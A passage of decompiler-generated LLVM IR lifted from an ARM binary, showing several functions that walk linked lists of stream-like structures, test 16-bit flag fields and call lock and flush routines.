dec_label_pc_14d54:                               ; preds = %.thread2, %dec_label_pc_14d48
  %v0_14d60 = load i32, i32* %r6.global-to-local, align 4
  %v2_14d60 = add i32 %v0_14d60, 24
  %v3_14d60 = inttoptr i32 %v2_14d60 to i32*
  %v4_14d60 = load i32, i32* %v3_14d60, align 4
  store i32 %v4_14d60, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_14d60)
  br label %dec_label_pc_14d6c

dec_label_pc_14d6c:                               ; preds = %.thread, %dec_label_pc_14cec, %dec_label_pc_14d54
  %v0_14d6c = load i32, i32* %r4.global-to-local, align 4
  %v2_14d74 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14d74, i32* @r4, align 4
  store i32 %v6_14cb4, i32* @r5, align 4
  store i32 %v12_14cb4, i32* @lr, align 4
  ret i32 %v0_14d6c

; uselistorder directives
  uselistorder i32 %v3_14d30, { 1, 0, 2 }
  uselistorder i32 %v3_14cd4, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 0, 5, 4, 3, 1, 2 }
  uselistorder label %dec_label_pc_14d6c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14d54, { 1, 0 }
}

define i32 @function_14d80(i32 %arg1) local_unnamed_addr {
dec_label_pc_14d80:
  %v0_14d80 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14d80, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_14d80
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_14d80, %bb
  %v10_14d8c = phi i32 [ %arg1, %dec_label_pc_14d80 ], [ 0, %bb ]
  ret i32 %v10_14d8c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_14d90(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_14d90:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_14d90 = load i32, i32* @r4, align 4
  store i32 %v3_14d90, i32* %stack_var_-28, align 4
  %v6_14d90 = load i32, i32* @r5, align 4
  %v9_14d90 = load i32, i32* @r6, align 4
  %v12_14d90 = load i32, i32* @r7, align 4
  %v21_14d90 = load i32, i32* @lr, align 4
  %v1_14d94 = add i32 %arg3, 52
  %v2_14d94 = inttoptr i32 %v1_14d94 to i32*
  %v3_14d94 = load i32, i32* %v2_14d94, align 4
  %v1_14d9c = sub i32 1, %v3_14d94
  %v2_14d9c = icmp ult i32 %v3_14d94, 2
  br i1 %v2_14d9c, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_14d90
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_14d90, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_14d9c, %dec_label_pc_14d90 ]
  %v0_14da4 = phi i32 [ 0, %bb ], [ %v1_14d9c, %dec_label_pc_14d90 ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  %v2_14da4 = icmp eq i32 %v0_14da4, 0
  store i32 124820, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  br i1 %v2_14da4, label %dec_label_pc_14df8, label %dec_label_pc_14dc0

dec_label_pc_14dc0:                               ; preds = %bb16
  %v1_14dc4 = add i32 %arg3, 56
  store i32 %v1_14dc4, i32* @r4, align 4
  %v4_14dd8 = load i32, i32* inttoptr (i32 124892 to i32*), align 4
  call void @__pseudo_branch(i32 %v4_14dd8)
  %v0_14dec = load i32, i32* @r5, align 4
  %v2_14dec = add i32 %v0_14dec, 16
  %v3_14dec = inttoptr i32 %v2_14dec to i32*
  %v4_14dec = load i32, i32* %v3_14dec, align 4
  store i32 %v4_14dec, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_14df8.542 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14dec)
  %v0_14df8.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_14dfc.pre = load i32, i32* @r7, align 4
  %v0_14e00.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14df8

dec_label_pc_14df8:                               ; preds = %bb16, %dec_label_pc_14dc0
  %v0_14e00 = phi i32 [ %arg3, %bb16 ], [ %v0_14e00.pre, %dec_label_pc_14dc0 ]
  %v0_14dfc = phi i32 [ %arg2, %bb16 ], [ %v0_14dfc.pre, %dec_label_pc_14dc0 ]
  %v0_14df8 = phi i32 [ %arg1, %bb16 ], [ %v0_14df8.pre, %dec_label_pc_14dc0 ]
  %v3_14e04 = inttoptr i32 %v0_14df8 to i8*
  %v4_14e04 = call i32 @function_1530c(i8* %v3_14e04, i32 %v0_14dfc, i32 %v0_14e00)
  %v0_14e08 = load i32, i32* %sl.global-to-local, align 4
  %v2_14e08 = icmp eq i32 %v0_14e08, 0
  store i32 %v4_14e04, i32* %r4.global-to-local, align 4
  br i1 %v2_14e08, label %dec_label_pc_14df8..thread3_crit_edge, label %bb17

dec_label_pc_14df8..thread3_crit_edge:            ; preds = %dec_label_pc_14df8
  %v0_14e24.pre = load i32, i32* @ip, align 4
  br label %.thread3

bb17:                                             ; preds = %dec_label_pc_14df8
  %v1_14e1c = load i32, i32* @r5, align 4
  %v3_14e1c = add i32 %v1_14e1c, 24
  %v4_14e1c = inttoptr i32 %v3_14e1c to i32*
  %v5_14e1c = load i32, i32* %v4_14e1c, align 4
  store i32 %v5_14e1c, i32* @ip, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_14df8..thread3_crit_edge, %bb17
  %v0_14e24 = phi i32 [ %v0_14e24.pre, %dec_label_pc_14df8..thread3_crit_edge ], [ %v5_14e1c, %bb17 ]
  %v2_14e24 = xor i1 %v2_14e08, true
  call void @__pseudo_cond_branch(i1 %v2_14e24, i32 %v0_14e24)
  %v0_14e28 = load i32, i32* %r4.global-to-local, align 4
  %v2_14e30 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_14e30, i32* %r4.global-to-local, align 4
  store i32 %v6_14d90, i32* @r5, align 4
  store i32 %v9_14d90, i32* @r6, align 4
  store i32 %v12_14d90, i32* @r7, align 4
  store i32 %v21_14d90, i32* @lr, align 4
  ret i32 %v0_14e28

; uselistorder directives
  uselistorder i32 %v3_14d94, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0 }
  uselistorder i32 52, { 9, 10, 11, 12, 13, 3, 14, 7, 8, 4, 16, 17, 1, 18, 0, 19, 20, 5, 6, 15, 2 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_14df8, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @function_14e3c(i32 %arg1) local_unnamed_addr {
dec_label_pc_14e3c:
  %v0_14e3c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14e3c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_14e3c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_14e3c, %bb
  %v10_14e48 = phi i32 [ %arg1, %dec_label_pc_14e3c ], [ 0, %bb ]
  ret i32 %v10_14e48

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_14e4c() local_unnamed_addr {
dec_label_pc_14e4c:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_14e4c = load i32, i32* @r4, align 4
  store i32 %v3_14e4c, i32* %stack_var_-24, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 124820, i32* %r6.global-to-local, align 4
  %v4_14e5c = load i32, i32* inttoptr (i32 124856 to i32*), align 8
  store i32 %v4_14e5c, i32* %r8.global-to-local, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_14e64 = load i32, i32* inttoptr (i32 124928 to i32*), align 2048
  store i32 %v4_14e64, i32* %r4.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_14e70 = load i32, i32* inttoptr (i32 124892 to i32*), align 4
  store i32 %v4_14e70, i32* %r7.global-to-local, align 4
  %v2_14e7c = ptrtoint i32* %stack_var_-40 to i32
  call void @__pseudo_branch(i32 %v4_14e70)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_14e90 = load i32, i32* %r6.global-to-local, align 4
  %v2_14e90 = add i32 %v0_14e90, 16
  %v3_14e90 = inttoptr i32 %v2_14e90 to i32*
  %v4_14e90 = load i32, i32* %v3_14e90, align 4
  store i32 %v4_14e90, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14e90)
  store i32 12, i32* %r3.global-to-local, align 4
  %v0_14ea0 = load i32, i32* %r6.global-to-local, align 4
  %v2_14ea0 = add i32 %v0_14ea0, 12
  %v3_14ea0 = inttoptr i32 %v2_14ea0 to i32*
  %v4_14ea0 = load i32, i32* %v3_14ea0, align 4
  store i32 %v4_14ea0, i32* %r3.global-to-local, align 4
  %v1_14ea4 = inttoptr i32 %v4_14ea0 to i32*
  %v2_14ea4 = load i32, i32* %v1_14ea4, align 4
  store i32 %v2_14ea4, i32* %r3.global-to-local, align 4
  %v7_14ea8 = icmp eq i32 %v2_14ea4, 1
  br i1 %v7_14ea8, label %dec_label_pc_14eb0, label %dec_label_pc_14f70

dec_label_pc_14eb0:                               ; preds = %dec_label_pc_14e4c
  store i32 48, i32* %r3.global-to-local, align 4
  %v2_14eb4 = add i32 %v0_14ea0, 48
  %v3_14eb4 = inttoptr i32 %v2_14eb4 to i32*
  %v4_14eb4 = load i32, i32* %v3_14eb4, align 4
  store i32 %v4_14eb4, i32* %r3.global-to-local, align 4
  %v1_14eb8 = inttoptr i32 %v4_14eb4 to i32*
  %v2_14eb8 = load i32, i32* %v1_14eb8, align 4
  store i32 %v2_14eb8, i32* %r3.global-to-local, align 4
  %tmp30 = icmp slt i32 %v2_14eb8, 1
  br i1 %tmp30, label %dec_label_pc_14f70, label %dec_label_pc_14ec4

dec_label_pc_14ec4:                               ; preds = %dec_label_pc_14eb0
  store i32 96, i32* %r3.global-to-local, align 4
  %v2_14ec8 = add i32 %v0_14ea0, 96
  %v3_14ec8 = inttoptr i32 %v2_14ec8 to i32*
  %v4_14ec8 = load i32, i32* %v3_14ec8, align 4
  store i32 %v4_14ec8, i32* %r4.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14e70)
  call void @__pseudo_branch(i32 %v4_14e90)
  %v0_14ef0 = load i32, i32* %r6.global-to-local, align 4
  %v2_14ef0 = add i32 %v0_14ef0, 44
  %v3_14ef0 = inttoptr i32 %v2_14ef0 to i32*
  %v4_14ef0 = load i32, i32* %v3_14ef0, align 4
  store i32 %v4_14ef0, i32* %r3.global-to-local, align 4
  %v1_14ef4 = inttoptr i32 %v4_14ef0 to i32*
  %v2_14ef4 = load i32, i32* %v1_14ef4, align 4
  store i32 %v2_14ef4, i32* %r4.global-to-local, align 4
  store i32 44, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_14f4011 = icmp eq i32 %v2_14ef4, 0
  br i1 %v2_14f4011, label %dec_label_pc_14f4c, label %dec_label_pc_14f04

dec_label_pc_14f04:                               ; preds = %dec_label_pc_14ec4, %dec_label_pc_14f3c
  %v0_14f282 = phi i32 [ %v0_14f3c, %dec_label_pc_14f3c ], [ %v2_14ef4, %dec_label_pc_14ec4 ]
  %v1_14f04 = inttoptr i32 %v0_14f282 to i16*
  %v2_14f04 = load i16, i16* %v1_14f04, align 2
  %v3_14f04 = zext i16 %v2_14f04 to i32
  store i32 %v3_14f04, i32* %r3.global-to-local, align 4
  %v2_14f08 = and i32 %v3_14f04, 32816
  %v7_14f0c = icmp eq i32 %v2_14f08, 48
  %v1_14f10 = add i32 %v0_14f282, 32
  %v2_14f10 = inttoptr i32 %v1_14f10 to i32*
  %v3_14f10 = load i32, i32* %v2_14f10, align 4
  store i32 %v3_14f10, i32* %r5.global-to-local, align 4
  br i1 %v7_14f0c, label %dec_label_pc_14f1c, label %.thread21

.thread21:                                        ; preds = %dec_label_pc_14f04
  store i32 %v0_14f282, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14f3c

dec_label_pc_14f1c:                               ; preds = %dec_label_pc_14f04
  %v0_14f1c = load i32, i32* %r7.global-to-local, align 4
  %v2_14f1c = icmp eq i32 %v0_14f1c, 0
  br i1 %v2_14f1c, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_14f1c
  %v1_14f20 = load i32, i32* %r6.global-to-local, align 4
  %v2_14f20 = load i32, i32* %r8.global-to-local, align 4
  %v3_14f20 = add i32 %v2_14f20, %v1_14f20
  %v4_14f20 = inttoptr i32 %v3_14f20 to i32*
  %v5_14f20 = load i32, i32* %v4_14f20, align 4
  store i32 %v5_14f20, i32* %r3.global-to-local, align 4
  %v3_14f24 = inttoptr i32 %v5_14f20 to i32*
  store i32 %v3_14f10, i32* %v3_14f24, align 4
  %v0_14f28 = load i32, i32* %r4.global-to-local, align 4
  %v1_14f28 = inttoptr i32 %v0_14f28 to i16*
  %v2_14f28 = load i16, i16* %v1_14f28, align 2
  %v3_14f28 = zext i16 %v2_14f28 to i32
  store i32 %v3_14f28, i32* %r3.global-to-local, align 4
  br label %bb31

bb:                                               ; preds = %dec_label_pc_14f1c
  %v2_14f288 = load i16, i16* %v1_14f04, align 2
  %v3_14f289 = zext i16 %v2_14f288 to i32
  store i32 %v3_14f289, i32* %r3.global-to-local, align 4
  %v3_14f2c = add i32 %v0_14f1c, 32
  %v4_14f2c = inttoptr i32 %v3_14f2c to i32*
  store i32 %v3_14f10, i32* %v4_14f2c, align 4
  %v0_14f30.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb31

bb31:                                             ; preds = %.thread, %bb
  %v0_14f30 = phi i32 [ %v3_14f28, %.thread ], [ %v0_14f30.pre, %bb ]
  %v1_14f30 = and i32 %v0_14f30, 8192
  %v2_14f30 = icmp eq i32 %v1_14f30, 0
  br i1 %v2_14f30, label %bb33, label %bb32

bb32:                                             ; preds = %bb31
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_14f38 = xor i1 %v2_14f30, true
  call void @__pseudo_cond_branch(i1 %v1_14f38, i32 ptrtoint (i32* @global_var_128a8.21 to i32))
  %v0_14f3c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14f3c

dec_label_pc_14f3c:                               ; preds = %.thread21, %bb33
  %v0_14f3c = phi i32 [ %v0_14f3c.pre, %bb33 ], [ %v3_14f10, %.thread21 ]
  store i32 %v0_14f3c, i32* %r4.global-to-local, align 4
  %v2_14f40 = icmp eq i32 %v0_14f3c, 0
  br i1 %v2_14f40, label %dec_label_pc_14f40.dec_label_pc_14f4c_crit_edge, label %dec_label_pc_14f04

dec_label_pc_14f40.dec_label_pc_14f4c_crit_edge:  ; preds = %dec_label_pc_14f3c
  %v0_14f58.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14f4c

dec_label_pc_14f4c:                               ; preds = %dec_label_pc_14f40.dec_label_pc_14f4c_crit_edge, %dec_label_pc_14ec4
  %v0_14f58 = phi i32 [ %v0_14f58.pre, %dec_label_pc_14f40.dec_label_pc_14f4c_crit_edge ], [ %v0_14ef0, %dec_label_pc_14ec4 ]
  store i32 24, i32* %r3.global-to-local, align 4
  %v2_14f58 = add i32 %v0_14f58, 24
  %v3_14f58 = inttoptr i32 %v2_14f58 to i32*
  %v4_14f58 = load i32, i32* %v3_14f58, align 4
  call void @__pseudo_branch(i32 %v4_14f58)
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_14f68 = load i32, i32* %r6.global-to-local, align 4
  %v2_14f68 = add i32 %v0_14f68, 48
  %v3_14f68 = inttoptr i32 %v2_14f68 to i32*
  %v4_14f68 = load i32, i32* %v3_14f68, align 4
  store i32 %v4_14f68, i32* %r3.global-to-local, align 4
  %v0_14f6c = load i32, i32* %r4.global-to-local, align 4
  %v2_14f6c = inttoptr i32 %v4_14f68 to i32*
  store i32 %v0_14f6c, i32* %v2_14f6c, align 4
  %v0_14f74.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14f70

dec_label_pc_14f70:                               ; preds = %dec_label_pc_14e4c, %dec_label_pc_14eb0, %dec_label_pc_14f4c
  %v0_14f74 = phi i32 [ %v0_14ea0, %dec_label_pc_14e4c ], [ %v0_14ea0, %dec_label_pc_14eb0 ], [ %v0_14f74.pre, %dec_label_pc_14f4c ]
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_14f74 = add i32 %v0_14f74, 12
  %v3_14f74 = inttoptr i32 %v2_14f74 to i32*
  %v4_14f74 = load i32, i32* %v3_14f74, align 4
  %v1_14f78 = inttoptr i32 %v4_14f74 to i32*
  %v2_14f78 = load i32, i32* %v1_14f78, align 4
  %v1_14f7c = add i32 %v2_14f78, -1
  store i32 %v1_14f7c, i32* %v1_14f78, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_14f90 = load i32, i32* %r6.global-to-local, align 4
  %v2_14f90 = add i32 %v0_14f90, 24
  %v3_14f90 = inttoptr i32 %v2_14f90 to i32*
  %v4_14f90 = load i32, i32* %v3_14f90, align 4
  call void @__pseudo_branch(i32 %v4_14f90)
  %v2_14fa0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_14fa0, i32* %r4.global-to-local, align 4
  ret i32 %v2_14e7c

; uselistorder directives
  uselistorder i32 %v0_14f3c, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 7, 3, 4, 5, 6, 8 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 20, 21, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* inttoptr (i32 124856 to i32*), { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_14f70, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14f3c, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_14f04, { 1, 0 }
}

define i32 @function_14fac(i16* %arg1) local_unnamed_addr {
dec_label_pc_14fac:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v0_14fac = load i1, i1* @cpsr_z, align 1
  %v2_14fac = load i32, i32* @r4, align 4
  br i1 %v0_14fac, label %bb, label %dec_label_pc_14fac..thread8_crit_edge

dec_label_pc_14fac..thread8_crit_edge:            ; preds = %dec_label_pc_14fac
  %v0_14fe8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread8

bb:                                               ; preds = %dec_label_pc_14fac
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_14fac..thread8_crit_edge, %bb
  %v0_15188 = phi i32 [ %v0_14fe8.pre, %dec_label_pc_14fac..thread8_crit_edge ], [ 0, %bb ]
  store i32 %v2_14fac, i32* %stack_var_-36, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  store i32 124820, i32* %sb.global-to-local, align 4
  %v4_14fe4 = load i32, i32* inttoptr (i32 124864 to i32*), align 64
  store i32 %v4_14fe4, i32* %r3.global-to-local, align 4
  %v9_14fe8 = icmp eq i32 %v0_15188, %v4_14fe4
  store i32 %v0_15188, i32* %fp.global-to-local, align 4
  br i1 %v9_14fe8, label %bb49, label %dec_label_pc_15000

bb49:                                             ; preds = %.thread8
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_15010

dec_label_pc_15000:                               ; preds = %.thread8
  store i32 256, i32* %r2.global-to-local, align 4
  %v2_15004 = icmp eq i32 %v0_15188, 0
  br i1 %v2_15004, label %dec_label_pc_15010, label %dec_label_pc_15178

dec_label_pc_15010:                               ; preds = %bb49, %dec_label_pc_15000
  %stack_var_-60.1.in = phi i32 [ 0, %bb49 ], [ 256, %dec_label_pc_15000 ]
  store i32 108, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_15024 = load i32, i32* inttoptr (i32 124928 to i32*), align 2048
  store i32 %v4_15024, i32* %r4.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v2_1502c = ptrtoint i32* %stack_var_-56 to i32
  %v4_15030 = load i32, i32* inttoptr (i32 124892 to i32*), align 4
  store i32 16, i32* %stack_var_-72, align 4
  store i32 %v2_1502c, i32* %r0.global-to-local, align 4
  store i32 %v4_15024, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15030)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_15050 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15050, i32* %r0.global-to-local, align 4
  %v0_15054 = load i32, i32* %sb.global-to-local, align 4
  %v2_15054 = add i32 %v0_15054, 16
  %v3_15054 = inttoptr i32 %v2_15054 to i32*
  %v4_15054 = load i32, i32* %v3_15054, align 4
  call void @__pseudo_branch(i32 %v4_15054)
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_15064 = add i32 %v0_15054, 12
  %v3_15064 = inttoptr i32 %v2_15064 to i32*
  %v4_15064 = load i32, i32* %v3_15064, align 4
  store i32 %v4_15064, i32* %r2.global-to-local, align 4
  %v1_15068 = inttoptr i32 %v4_15064 to i32*
  %v2_15068 = load i32, i32* %v1_15068, align 4
  store i32 24, i32* %sl.global-to-local, align 4
  %v1_15070 = add i32 %v2_15068, 1
  store i32 %v1_15070, i32* %r3.global-to-local, align 4
  %v2_15074 = add i32 %v0_15054, 24
  %v3_15074 = inttoptr i32 %v2_15074 to i32*
  %v4_15074 = load i32, i32* %v3_15074, align 4
  store i32 %v1_15070, i32* %v1_15068, align 4
  store i32 %v2_1502c, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15074)
  store i32 96, i32* %r3.global-to-local, align 4
  %v0_15090 = load i32, i32* %sb.global-to-local, align 4
  %v2_15090 = add i32 %v0_15090, 96
  %v3_15090 = inttoptr i32 %v2_15090 to i32*
  %v4_15090 = load i32, i32* %v3_15090, align 4
  store i32 %v4_15090, i32* @r4, align 4
  store i32 %v4_15090, i32* %r2.global-to-local, align 4
  store i32 %v2_1502c, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15030)
  %v0_150a8 = load i32, i32* @r4, align 4
  store i32 %v0_150a8, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15054)
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_150b8 = load i32, i32* %sb.global-to-local, align 4
  %v2_150b8 = add i32 %v0_150b8, 44
  %v3_150b8 = inttoptr i32 %v2_150b8 to i32*
  %v4_150b8 = load i32, i32* %v3_150b8, align 4
  store i32 %v4_150b8, i32* %r3.global-to-local, align 4
  store i32 %v2_1502c, i32* %r0.global-to-local, align 4
  %v1_150c4 = inttoptr i32 %v4_150b8 to i32*
  %v2_150c4 = load i32, i32* %v1_150c4, align 4
  store i32 %v2_150c4, i32* @r7, align 4
  call void @__pseudo_branch(i32 %v4_15074)
  %v0_150d0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_150d0, i32* @r6, align 4
  %v2_150d4 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_150d4, i32* @r8, align 4
  store i32 72, i32* %fp.global-to-local, align 4
  %v0_15168.pr = load i32, i32* @r7, align 4
  %v2_1516828 = icmp eq i32 %v0_15168.pr, 0
  br i1 %v2_1516828, label %dec_label_pc_15170, label %dec_label_pc_150dc

dec_label_pc_150dc:                               ; preds = %dec_label_pc_15010, %dec_label_pc_15164
  %v0_150e8 = phi i32 [ %v3_15164, %dec_label_pc_15164 ], [ %v0_15168.pr, %dec_label_pc_15010 ]
  %v1_150dc = inttoptr i32 %v0_150e8 to i16*
  %v2_150dc = load i16, i16* %v1_150dc, align 2
  %v3_150dc = zext i16 %v2_150dc to i32
  store i32 %v3_150dc, i32* %r3.global-to-local, align 4
  %v1_150e0 = and i32 %v3_150dc, 64
  %v2_150e0 = icmp eq i32 %v1_150e0, 0
  br i1 %v2_150e0, label %dec_label_pc_15164, label %dec_label_pc_150e8

dec_label_pc_150e8:                               ; preds = %dec_label_pc_150dc
  %v1_150e8 = add i32 %v0_150e8, 56
  store i32 %v1_150e8, i32* @r4, align 4
  store i32 %v1_150e8, i32* %r2.global-to-local, align 4
  store i32 %v2_1502c, i32* %r0.global-to-local, align 4
  %v0_150f8 = load i32, i32* %sb.global-to-local, align 4
  %v1_150f8 = load i32, i32* %fp.global-to-local, align 4
  %v2_150f8 = add i32 %v1_150f8, %v0_150f8
  %v3_150f8 = inttoptr i32 %v2_150f8 to i32*
  %v4_150f8 = load i32, i32* %v3_150f8, align 4
  call void @__pseudo_branch(i32 %v4_150f8)
  %v0_15104 = load i32, i32* @r4, align 4
  store i32 %v0_15104, i32* %r0.global-to-local, align 4
  %v0_15108 = load i32, i32* %sb.global-to-local, align 4
  %v1_15108 = load i32, i32* @r8, align 4
  %v2_15108 = add i32 %v1_15108, %v0_15108
  %v3_15108 = inttoptr i32 %v2_15108 to i32*
  %v4_15108 = load i32, i32* %v3_15108, align 4
  call void @__pseudo_branch(i32 %v4_15108)
  %v0_15114 = load i32, i32* @r7, align 4
  %v1_15114 = inttoptr i32 %v0_15114 to i16*
  %v2_15114 = load i16, i16* %v1_15114, align 2
  %v3_15114 = zext i16 %v2_15114 to i32
  store i32 %stack_var_-60.1.in, i32* %r2.global-to-local, align 4
  %v2_1511c = or i32 %v3_15114, %stack_var_-60.1.in
  %v1_15120 = xor i32 %v2_1511c, 320
  store i32 %v1_15120, i32* %r3.global-to-local, align 4
  %v1_15124 = and i32 %v1_15120, 832
  %v2_15124 = icmp eq i32 %v1_15124, 0
  br i1 %v2_15124, label %dec_label_pc_1512c, label %bb50

dec_label_pc_1512c:                               ; preds = %dec_label_pc_150e8
  store i32 %v0_15114, i32* %r0.global-to-local, align 4
  %v1_15130 = call i32 @function_14c84(i32 %v0_15114)
  store i32 %v1_15130, i32* %r0.global-to-local, align 4
  %v2_15134 = icmp eq i32 %v1_15130, 0
  br i1 %v2_15134, label %.thread16, label %.thread17

.thread16:                                        ; preds = %dec_label_pc_1512c
  %v1_15138 = load i32, i32* @r7, align 4
  %v2_15138 = inttoptr i32 %v1_15138 to i16*
  %v3_15138 = load i16, i16* %v2_15138, align 2
  %v4_15138 = zext i16 %v3_15138 to i32
  store i32 %v4_15138, i32* %r3.global-to-local, align 4
  %v2_1513c = add i32 %v1_15138, 8
  %v3_1513c = inttoptr i32 %v2_1513c to i32*
  %v4_1513c = load i32, i32* %v3_1513c, align 4
  store i32 %v4_1513c, i32* %r2.global-to-local, align 4
  %v2_15140 = and i32 %v4_15138, 65471
  store i32 %v2_15140, i32* %r3.global-to-local, align 4
  %v3_15144 = add i32 %v1_15138, 28
  %v4_15144 = inttoptr i32 %v3_15144 to i32*
  store i32 %v4_1513c, i32* %v4_15144, align 4
  %v1_15148 = load i32, i32* %r3.global-to-local, align 4
  %v2_15148 = trunc i32 %v1_15148 to i16
  %v3_15148 = load i32, i32* @r7, align 4
  %v4_15148 = inttoptr i32 %v3_15148 to i16*
  store i16 %v2_15148, i16* %v4_15148, align 2
  br label %bb50

.thread17:                                        ; preds = %dec_label_pc_1512c
  store i32 -1, i32* @r6, align 4
  br label %bb50

bb50:                                             ; preds = %.thread16, %dec_label_pc_150e8, %.thread17
  store i32 %v2_1502c, i32* %r0.global-to-local, align 4
  %v0_15158 = load i32, i32* %sb.global-to-local, align 4
  %v1_15158 = load i32, i32* %sl.global-to-local, align 4
  %v2_15158 = add i32 %v1_15158, %v0_15158
  %v3_15158 = inttoptr i32 %v2_15158 to i32*
  %v4_15158 = load i32, i32* %v3_15158, align 4
  call void @__pseudo_branch(i32 %v4_15158)
  %v0_15164.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_15164

dec_label_pc_15164:                               ; preds = %dec_label_pc_150dc, %bb50
  %v0_15164 = phi i32 [ %v0_150e8, %dec_label_pc_150dc ], [ %v0_15164.pre, %bb50 ]
  %v1_15164 = add i32 %v0_15164, 32
  %v2_15164 = inttoptr i32 %v1_15164 to i32*
  %v3_15164 = load i32, i32* %v2_15164, align 4
  store i32 %v3_15164, i32* @r7, align 4
  %v2_15168 = icmp eq i32 %v3_15164, 0
  br i1 %v2_15168, label %dec_label_pc_15170, label %dec_label_pc_150dc

dec_label_pc_15170:                               ; preds = %dec_label_pc_15164, %dec_label_pc_15010
  %v0_15170 = call i32 @function_14e4c()
  store i32 %v0_15170, i32* %r0.global-to-local, align 4
  %v0_151ac.pre = load i32, i32* @r6, align 4
  br label %bb52

dec_label_pc_15178:                               ; preds = %dec_label_pc_15000
  %v1_15178 = inttoptr i32 %v0_15188 to i16*
